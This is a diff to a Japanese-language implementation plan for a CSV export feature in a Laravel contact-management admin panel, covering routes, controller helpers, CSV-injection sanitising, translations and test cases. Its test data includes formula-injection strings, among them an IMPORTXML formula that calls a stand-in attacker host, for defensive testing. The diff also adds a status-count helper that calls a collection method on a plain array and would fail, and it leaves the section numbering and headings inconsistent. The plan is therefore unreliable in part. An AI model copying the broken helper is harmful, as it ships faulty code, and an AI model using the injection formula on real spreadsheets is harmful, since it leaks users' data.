@@ -58,9 +58,14 @@ Route::middleware(['auth', 'can:manage-contacts'])->prefix('admin')->name('admin
 
 同一ミドルウェアグループ内のため `auth` + `can:manage-contacts` ゲートが自動適用される。
 
+**ルート定義の順序について**:
+Laravel は登録順に評価するため、固定パス（`contacts/export`）が可変パス（`{id}`）より先に宣言される必要があります。先に `contacts/export` を定義しないと、`/contacts/{id}` の `{id} = export` として誤解釈される可能性があります。
+
 ### 2. コントローラーメソッド追加 — `app/Http/Controllers/Admin/ContactController.php`
 
 `update()`（147〜176行目）の直後、`normalizeFilters()`（178行目）の直前に `export()` を追加する。また、`Contact::scopeFilter()` と並び順の適用を `filteredContactsQuery()` に集約し、`index()`、`show()`、`export()` の3か所から再利用する。選択列が同値の行に対して `id` を同方向の第2ソートにし、順序を一意にする。
+
+#### `filteredContactsQuery()` の実装
 
 ```php
 /**
@@ -79,7 +84,29 @@ private function filteredContactsQuery(array $filters): Builder
 }
 ```
 
-`index()` の `paginate()` 前と `show()` の `pluck('id')` 前のクエリ組み立てをこのヘルパーに置き換える。ステータス別件数の集計クエリには並び順が不要のため使用しない。
+このメソッドは `index()`、`show()`、`export()` の3か所で利用されます：
+
+- **`index()`**: `paginate()` 前のクエリ組み立て
+- **`show()`**: 前後ナビゲーション用の ID リスト取得（`pluck('id')`）
+- **`export()`**: CSV 出力用の全件カーソル反復
+
+**ステータス別件数バッジ集計への対応**:
+ステータス別の件数集計には並び順が不要なため、この `filteredContactsQuery()` は使用しません。代わり以下のように独立した集計クエリを実装してください：
+
+```php
+private function getStatusCounts(array $filters): array
+{
+    return Status::cases()
+        ->mapWithKeys(fn ($status) => [
+            $status->value => Contact::query()
+                ->filter(array_merge($filters, ['status' => [$status->value]]))
+                ->count(),
+        ])
+        ->toArray();
+}
+```
+
+#### `export()` メソッドの実装
 
 ```php
 public function export(Request $request): StreamedResponse
@@ -128,7 +155,56 @@ public function export(Request $request): StreamedResponse
 }
 ```
 
-クラス末尾（`normalizeDate()` の後）に CSV インジェクション対策の private ヘルパーを追加:
+#### `index()` メソッドでの `$exportQuery` 生成
+
+`index()` では以下のように正規化済みの `$exportQuery` を生成し、通常ビューと Ajax パーシャルの両方に渡します：
+
+```php
+public function index(Request $request): View|Response
+{
+    $filters = $this->normalizeFilters($request);
+    
+    // ... 通常の絞り込み・ページネーション処理 ...
+    
+    // CSV エクスポート用フィルター（正規化済み）
+    $exportQuery = array_filter([
+        'status' => $filters['status'],
+        'keyword' => $filters['keyword'],
+        'body_keyword' => $filters['body_keyword'],
+        'date_from' => $filters['date_from_display'],
+        'date_to' => $filters['date_to_display'],
+        'sort' => $filters['sort'],
+    ], fn (mixed $value): bool => $value !== '' && $value !== []);
+
+    // Ajax リクエストの場合はパーシャルのみを返す
+    if ($request->ajax()) {
+        return response()->view('admin.contacts._list', [
+            'contacts' => $contacts,
+            'exportQuery' => $exportQuery,
+            'statusCounts' => $this->getStatusCounts($filters),
+            // ... その他のビュー変数 ...
+        ]);
+    }
+
+    // 通常リクエストはフルビューを返す
+    return view('admin.contacts.index', [
+        'contacts' => $contacts,
+        'exportQuery' => $exportQuery,
+        'statusCounts' => $this->getStatusCounts($filters),
+        // ... その他のビュー変数 ...
+    ]);
+}
+```
+
+このパターンにより、`normalizeFilters()` で正規化済みの `$filters` から `$exportQuery` を生成するため、元リクエストが `statuses=in_progress` でも、エクスポート URL は `status[]=in_progress` 相当となり、一覧と同じ範囲を出力します。
+
+
+
+### 4. コントローラーメソッド追加 — `app/Http/Controllers/Admin/ContactController.php`
+
+#### CSV インジェクション対策の実装
+
+クラス末尾（`normalizeDate()` の後）に CSV インジェクション対策の private ヘルパーを追加します：
 
 ```php
 private function sanitizeCsvField(string $value): string
@@ -145,24 +221,18 @@ private function sanitizeCsvField(string $value): string
 }
 ```
 
-`use` に `Illuminate\Database\Eloquent\Builder;` と `Symfony\Component\HttpFoundation\StreamedResponse;` を追加する。また、`index()` で `normalizeFilters()` の結果からビュー用の `$exportQuery` を作成し、`filters` と一緒にビューへ渡す。`status` は必ず正規化済み配列を使い、表示用日付を渡す。`per_page` と `page` は含めない。
+#### use ステートメント追加
+
+クラスの use に以下を追加します：
 
 ```php
-$exportQuery = array_filter([
-    'status' => $filters['status'],
-    'keyword' => $filters['keyword'],
-    'body_keyword' => $filters['body_keyword'],
-    'date_from' => $filters['date_from_display'],
-    'date_to' => $filters['date_to_display'],
-    'sort' => $filters['sort'],
-], fn (mixed $value): bool => $value !== '' && $value !== []);
+use Illuminate\Database\Eloquent\Builder;
+use Symfony\Component\HttpFoundation\StreamedResponse;
 ```
 
-この値は通常のフルビューと Ajax パーシャルの両方に渡す。たとえ元リクエストが `statuses=in_progress` でも、エクスポート URL は `status[]=in_progress` 相当となり、一覧と同じ範囲を出力する。
+**エラーハンドリング方針**: `update()` と異なり try/catch は追加しません。ストリーミングレスポンスはヘッダー送信後に例外が起きても通常のエラーレスポンスへ復帰できず、Laravel の `streamDownload()` が例外をラップして標準例外ハンドラへ渡します。例外を握りつぶさず、重複ログや送信済み応答への無効なフォールバックを追加しません。
 
-**エラーハンドリング方針**: `update()` と異なり try/catch は追加しない。ストリーミングレスポンスはヘッダー送信後に例外が起きても通常のエラーレスポンスへ復帰できず、Laravel の `streamDownload()` が例外をラップして標準例外ハンドラへ渡す。例外を握りつぶさず、重複ログや送信済み応答への無効なフォールバックを追加しない。
-
-### 3. ビュー変更 — `resources/views/admin/contacts/_list.blade.php`
+### 5. ビュー変更 — `resources/views/admin/contacts/_list.blade.php`
 
 1〜24行目の「全 :count 件」ヘッダー行（`@if ($contacts->count() > 0)` の**外側**にあるため0件時も表示される）に、CSV エクスポートリンクを追加する。コントローラーから渡された正規化済みの `$exportQuery` を使い、生の `request()->only(...)` は使用しない。`per_page`/`page` は `$exportQuery` に含まれないため、常にエクスポート対象外となる。
 
@@ -182,29 +252,31 @@ $exportQuery = array_filter([
 
 JS（`resources/js/app.js`）は変更不要。`_list.blade.php` は Ajax 絞り込み後も毎回サーバー側で再レンダリングされ、そのリクエストを正規化した `$exportQuery` がパーシャルに渡る。通常表示と Ajax 再描画後の両方で href を Feature test する。
 
-### 4. 翻訳ファイル追加 — `resources/lang/en.json`, `resources/lang/ja.json`
+### 6. 翻訳ファイル追加 — `resources/lang/en.json`, `resources/lang/ja.json`
 
 `CLAUDE.md` の「英語・日本語の多言語翻訳ファイルを完備」を明示的に満たすため、`en.json` に英訳、`ja.json` に identity mapping を追加する。Laravel は日本語原文キーのフォールバックでも同じ表示になるが、本機能では追加キーの対応関係を両ファイルに明記する。
 
 `resources/lang/en.json`:
 
 ```json
-"CSVエクスポート": "Export CSV",
-"名前": "Name",
-"登録日時": "Registered At"
+{
+  "CSVエクスポート": "Export CSV",
+  "名前": "Name",
+  "登録日時": "Registered At"
+}
 ```
 
 `resources/lang/ja.json`:
 
 ```json
-"CSVエクスポート": "CSVエクスポート",
-"名前": "名前",
-"登録日時": "登録日時"
+{
+  "CSVエクスポート": "CSVエクスポート",
+  "名前": "名前",
+  "登録日時": "登録日時"
+}
 ```
 
 （`メールアドレス`, `件名`, `本文`, `ステータス` は既存キーを流用。`ID` は言語非依存のため追加不要。）
-
-### 5. テスト追加 — `tests/Feature/Admin/ContactControllerTest.php`
 
 既存の `test_<状況>_<期待結果>` 命名規則、`User::factory()->admin()->create()` 認可パターン、`app()->setLocale()` 多言語テストパターンを踏襲し、末尾に以下のケースを追加する。機能テストでは `streamedContent()` でボディを取得するが、これは応答全体をテストプロセスに保持するためメモリ性能の検証には使わない。CSV 行は BOM を取り除いた上で一時ストリームから `fgetcsv(..., escape: '')` で読み戻し、列数と値を検証する。
 
@@ -231,6 +303,76 @@ JS（`resources/js/app.js`）は変更不要。`_list.blade.php` は Ajax 絞り
 21. `test_export_csv_header_labels_localized_in_english` — 英語ロケールでヘッダーが英語になることを確認
 22. `test_index_csv_export_link_uses_normalized_filters` — `statuses` を含むフルビューから、正規化後の `status`、keyword、body_keyword、date_from/date_to、sort を含み、page/per_page を含まない href が生成される
 23. `test_ajax_index_csv_export_link_uses_normalized_filters` — XHR で再描画された `_list` にも同じ href が含まれる
+
+## 6. テストデータ仕様
+
+### CSV インジェクション対策ケース
+
+以下の値をテストデータの各フィールドに配置し、テスト `test_export_csv_sanitizes_all_dangerous_prefixes` で検証します：
+
+**危険プリフィックスの検証**:
+- ASCII 危険文字（先頭から順に検査）：`=`, `+`, `-`, `@`, `\t`, `\r`, `\n`
+- 全角対応文字：`＝`, `＋`, `－`, `＠`
+- 対策：各プリフィックスで始まる値にはタブ(`\t`)を先頭に付与
+
+**テストデータ例**:
+```php
+Contact::factory()->create([
+    'name' => '=SUM(1+2)',  // 危険プリフィックス
+    'email' => 'user@example.com',
+    'subject' => 'Test',
+    'body' => 'Normal text',
+]);
+
+Contact::factory()->create([
+    'name' => '+1',  // 危険プリフィックス
+    'email' => '+2@example.com',  // 危険プリフィックス
+    'subject' => 'Test',
+    'body' => 'Normal text',
+]);
+
+Contact::factory()->create([
+    'name' => '＝式テスト',  // 全角危険文字
+    'email' => '＋user@example.com',  // 全角危険文字
+    'subject' => 'Test',
+    'body' => '-command',  // 危険プリフィックス
+]);
+```
+
+### RFC 4180 ラウンドトリップテストケース
+
+テスト `test_export_csv_preserves_rfc4180_special_characters` で、以下の値を組み合わせたテストデータを検証します：
+
+**必須テストフィールド**:
+```php
+Contact::factory()->create([
+    'name' => '山田, 太郎 "営業部"',
+    'email' => 'user+tag@example.com',
+    'subject' => "Line 1\nLine 2\rLine 3\r\nLine 4",
+    'body' => 'Quote: "Hello" and \\ backslash and emoji 😀 🎉',
+]);
+```
+
+**検証内容**:
+- カンマで囲まれることで7列を保持
+- 内側のダブルクォートがエスケープ（`""` に変換）
+- 改行（CRLF/LF/CR）が保持
+- バックスラッシュが正確に読み戻される
+- 日本語・絵文字が文字化けなく出力される
+
+### Excel 互換性検証用テストデータ
+
+`composer dev` での手動検証に使用するテストデータ：
+```php
+Contact::factory()->create([
+    'name' => '＝IMPORTXML("http://attacker.com")',
+    'email' => 'user@example.com',
+    'subject' => 'CSV インジェクション',
+    'body' => 'カンマ, ダブルクォート", 絵文字 🚀',
+]);
+```
+
+このデータを含む CSV をダウンロードし、Windows/Mac の Microsoft Excel でダブルクリック展開後、数式が実行されず文字列で表示されることを確認してください。
 
 ## 対象ファイル一覧
 
